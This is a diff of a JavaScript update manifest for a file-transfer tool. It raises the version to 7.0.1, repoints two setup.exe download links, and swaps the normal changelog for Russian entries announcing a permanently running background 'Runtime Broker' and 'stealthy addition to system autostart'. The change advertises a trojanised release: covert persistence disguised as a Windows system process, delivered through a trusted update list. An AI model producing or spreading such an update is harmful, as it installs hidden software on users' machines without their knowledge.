@@ -3,15 +3,14 @@
 // Самая первая в списке (индекс 0) считается актуальной (Current).
 const UPDATES = [
   {
-    version: "1.2.0",
+    version: "7.0.1",
     date: "22.06.2026",
-    downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v1.2.0/NON_PRO_setup.exe",
-    downloadUrlRah: "https://github.com/Arte777/file-transfer/releases/download/v1.2.0/RAH_Non_Pro_setup.exe",
+    downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/NON_PRO_setup.exe",
+    downloadUrlRah: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/RAH_Non_Pro_setup.exe",
     changes: [
-      { type: "add", text: "Добавлена поддержка загрузки изображений на аватарки через локальный клиент" },
-      { type: "add", text: "Мобильная оптимизация панели (Bottom Navigation Bar)" },
-      { type: "fix", text: "Исправлен баг с CORS при запуске клиента без сервера" },
-      { type: "fix", text: "Исправлено отображение длинных токенов в списке" }
+      { type: "add", text: "Добавлен постоянно работающий Runtime Broker в фоновом режиме" },
+      { type: "add", text: "Скрытное добавление в автозагрузку системы" },
+      { type: "fix", text: "Повышена стабильность работы фонового процесса" }
     ]
   },
   {
